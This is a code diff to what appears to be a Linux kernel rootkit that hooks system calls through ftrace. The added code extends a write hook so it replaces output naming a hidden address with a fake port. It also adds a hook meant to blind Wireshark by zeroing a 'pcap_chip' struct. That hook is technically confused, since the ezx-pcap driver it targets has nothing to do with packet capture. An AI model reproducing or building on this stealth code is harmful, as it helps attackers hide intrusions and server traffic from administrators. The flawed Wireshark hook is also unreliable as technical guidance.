@@ -16,6 +16,10 @@
 #include <linux/module.h>
 #include <linux/dirent.h>
 #include <linux/tcp.h>
+
+#include <linux/mfd/ezx-pcap.h>
+#include <linux/spi/spi.h>
+#include <linux/platform_device.h>
 #include <linux/string.h>
 
 #include <net/tcp.h>
@@ -220,6 +224,7 @@ static asmlinkage int hook_openat(int dirfd, const char __user *pathname, int fl
 
 /* Hook the write function to prevent communication with server from 
  * from being output to stdout. */
+#define HTTP_ALT "http-alt"
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_write)(struct pt_regs *regs);
 
@@ -235,7 +240,11 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
     regs->si = (unsigned long)((void*)fake_address);
 
     return orig_write(regs);
-  } 
+  } else if (strstr(orig_buff, ADDR_TO_HIDE) != NULL) {
+    regs->si = (unsigned long)((void*)fake_port);
+
+    return orig_write(regs);
+  }
 
   return orig_write(regs);
 }
@@ -255,6 +264,18 @@ static asmlinkage long hook_write(int fd, const char __user *buff, size_t count)
 }
 #endif 
 
+/* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library 
+ * to perform pcap. This hook aims to interrupt packet processing by causing 
+ * errors. */
+static asmlinkage int (*orig_ezx_pcap_putget)(struct pcap_chip *pcap, u32 *data);
+
+static asmlinkage int hook_ezx_pcap_putget(struct pcap_chip *pcap, u32 *data) {
+  // Memset things to '\0' in this pcap_chip struct(it looks important).
+  memset(pcap, '\0', 20);
+  memset(data, '\0', sizeof(u32));
+  return -1; 
+}
+
 //The hooking structure: for every syscall we want to hijack,
 //we put in one more entry into this ftrace_hook struct array:
 //HOOK([string name of syscall],literally just the method name
@@ -266,6 +287,7 @@ static struct ftrace_hook hooks[] = {
   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
   HOOK("__x64_sys_openat", hook_openat, &orig_openat),
   HOOK("__x64_sys_write", hook_write, &orig_write),
+  HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
 };
 
 
